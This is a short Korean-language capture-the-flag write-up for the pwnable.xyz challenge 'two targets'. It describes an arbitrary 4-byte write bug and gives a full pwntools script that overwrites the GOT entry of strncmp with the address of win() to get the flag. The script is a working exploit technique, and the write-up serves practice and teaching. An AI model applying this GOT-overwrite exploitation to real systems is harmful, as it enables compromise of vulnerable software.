# [pwnable.xyz] two targets

> Which one would you exploit?

## Bug

![image](https://github.com/user-attachments/assets/9388b297-1c99-4587-aa3c-71e389e6b858)

![image](https://github.com/user-attachments/assets/eeba6afd-bda2-4ef8-8844-9286fd0f67fe)

임의의 주소에 임의의 4바이트 값을 쓸 수 있다.

## Exploit

두 가지 방법으로 exploit이 가능하다.

-   `auth(s)`를 `true`로 만들어서 `win()` 호출
-   `3. Change age`의 AAW를 이용하여 GOT overwrite

덜 귀찮아 보이는 두 번째 방법을 선택했다.

`strncmp()`의 GOT를 `win()`의 주소로 덮고 `auth()`를 실행하면 `strncmp()`가 호출되어 플래그를 획득할 수 있다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30031)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40099C
strncmp_got = 0x603018

sla(b"> ", b"2")
sla(b"nationality: ", b"a" * 0x10 + p64(strncmp_got))

sla(b"> ", b"3")
sla(b"age: ", str(win).encode())

sla(b"> ", b"4")

r.interactive()
```

![image](https://github.com/user-attachments/assets/889ff068-49d5-4348-a249-b011c4af8a8a)
